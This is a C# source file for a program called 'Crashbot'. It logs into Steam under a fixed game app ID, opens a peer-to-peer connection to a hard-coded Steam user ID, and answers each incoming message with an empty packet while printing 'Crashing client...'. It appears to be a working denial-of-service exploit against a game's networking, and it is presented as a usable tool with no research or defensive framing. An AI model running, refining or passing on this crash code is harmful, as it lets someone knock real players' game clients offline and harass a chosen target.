using Newtonsoft.Json;
using Steamworks;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;
using static SteamKit2.GC.Dota.Internal.CMsgDOTALeague;

namespace Crashbot
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Crashbot");
            Environment.CurrentDirectory = Directory.GetParent(Assembly.GetExecutingAssembly()?.Location ?? AppContext.BaseDirectory)!.FullName;
            Console.WriteLine(Environment.CurrentDirectory);
            File.WriteAllText("steam_appid.txt", "387990");

            System.Timers.Timer mainloop = new()
            {
                Interval = 100,
                AutoReset = true,
                Enabled = true
            };

            mainloop.Elapsed += (s, e) =>
            {
                //SteamAPI.RunCallbacks();
            };

            //mainloop.Start();


            if (!Steamworks.SteamAPI.Init())
            {
                Debug.WriteLine("SteamAPI.Init() failed!");
                return;
            }
            else
            {
                Console.WriteLine("BLoggedOn: " + Steamworks.SteamUser.BLoggedOn());
                Console.WriteLine("SteamID: " + Steamworks.SteamUser.GetSteamID());

            }

            var steamuser = new SteamKit2.SteamID(76561198299556567);
            CSteamID cSteamID = new(steamuser.ConvertToUInt64());
            Console.WriteLine($"Logged in + [{cSteamID.m_SteamID}]");
            /*
            System.Timers.Timer t = new()
            {
                Enabled = true,
                AutoReset = true,
                Interval = 50
            };

            t.Elapsed += (s, e) =>
            {
                Steamworks.SteamNetworkingSockets.RunCallbacks();

                while (SteamNetworking.IsP2PPacketAvailable(out uint size))
                {
                    // allocate buffer and needed variables
                    var buffer = new byte[size];

                    // read the message into the buffer
                    if (SteamNetworking.ReadP2PPacket(buffer, size, out uint bytesRead, out CSteamID remoteId))
                    {
                        string message = System.Text.Encoding.UTF8.GetString(buffer, 0, (int)bytesRead);
                        Console.WriteLine("Received a message: " + message);
                    }
                }
                    
                Steamworks.SteamNetworking.GetP2PSessionState(cSteamID, out Steamworks.P2PSessionState_t state);
                if (state.m_bConnectionActive == 1)
                {
                    Console.WriteLine("Connection is active");
                    Console.WriteLine(JsonConvert.SerializeObject(state, Formatting.Indented));
                }
                else if (state.m_eP2PSessionError != 0)
                {
                    Console.WriteLine("Connection error: " + state.m_eP2PSessionError);
                    Console.WriteLine(JsonConvert.SerializeObject(state, Formatting.Indented));

                    t.Stop();
                    //Steamworks.SteamNetworking.CloseP2PChannelWithUser(cSteamID, 0);
                    //Steamworks.SteamNetworking.CloseP2PSessionWithUser(cSteamID);
                }
            };

            t.Start();*/

            SteamNetworkingIdentity remoteIdentity = new();
            remoteIdentity.SetSteamID(cSteamID);

            Console.WriteLine("BLoggedOn: " + Steamworks.SteamUser.BLoggedOn());

            var res = Steamworks.SteamNetworkingSockets.InitAuthentication();
            Steamworks.SteamNetworkingSockets.RunCallbacks();
            Steamworks.SteamAPI.RunCallbacks();
            // Console.WriteLine(res);

            Steamworks.SteamNetworkingSockets.GetAuthenticationStatus(out Steamworks.SteamNetAuthenticationStatus_t status);
            while (status.m_eAvail != ESteamNetworkingAvailability.k_ESteamNetworkingAvailability_Current)
            {
                Steamworks.SteamAPI.RunCallbacks();
                Steamworks.SteamNetworkingSockets.RunCallbacks();

                Steamworks.SteamNetworkingSockets.GetAuthenticationStatus(out status);
                Thread.Sleep(100);
            }

            // Console.WriteLine(JsonConvert.SerializeObject(status, Formatting.Indented));
            Console.WriteLine("m_eAvail: " + status.m_eAvail);

            bool state = false;
            HSteamNetConnection? conn = null;

            Steamworks.SteamAPI.RunCallbacks();
            Steamworks.SteamNetworkingSockets.RunCallbacks();

            conn = Steamworks.SteamNetworkingSockets.ConnectP2P(ref remoteIdentity, 0, 0, []);
            Steamworks.SteamNetworkingSockets.FlushMessagesOnConnection(conn.Value);
            Console.WriteLine("Init connection...");

            Steamworks.SteamAPI.RunCallbacks();
            Steamworks.SteamNetworkingSockets.RunCallbacks();

            Steamworks.SteamNetworkingSockets.GetConnectionInfo(conn.Value, out Steamworks.SteamNetConnectionInfo_t info);
            while (info.m_eState != ESteamNetworkingConnectionState.k_ESteamNetworkingConnectionState_Connected)
            {
                Steamworks.SteamAPI.RunCallbacks();
                Steamworks.SteamNetworkingSockets.RunCallbacks();

                Steamworks.SteamNetworkingSockets.GetConnectionInfo(conn.Value, out info);

                Thread.Sleep(100);
            }

            // Console.WriteLine(JsonConvert.SerializeObject(info, Formatting.Indented));
            Console.WriteLine("m_eState: " + info.m_eState);
            Console.WriteLine("Connected!");

            //Console.ReadLine();
            int maxMessages = 1;
            while (true)
            {
                IntPtr[] messagePointers = new IntPtr[maxMessages];
                int messageCount = Steamworks.SteamNetworkingSockets.ReceiveMessagesOnConnection(conn.Value, messagePointers, maxMessages);

                if (messageCount > 0)
                {
                    /*
                    for (int i = 0; i < messageCount; i++)
                    {
                        // Marshaling the message pointer to a SteamNetworkingMessage_t structure
                        SteamNetworkingMessage_t netMessage = Marshal.PtrToStructure<SteamNetworkingMessage_t>(messagePointers[i]);

                        // Process the message
                        ProcessMessage(netMessage);

                        // Don't forget to release the message
                        netMessage.Release();
                    }
                    */
                    Steamworks.SteamNetworkingSockets.SendMessageToConnection(conn.Value, 0, 0, 0, out long messageID);
                    Console.WriteLine("Crashing client...");
                }
                else
                {
                    // No messages received - you can add a sleep here to reduce CPU usage
                    Thread.Sleep(10); // Sleep for 10 milliseconds
                }
            }
            //Steamworks.SteamNetworkingSockets.CloseConnection(conn.Value, 0, "\0", false);
        }
    }
}
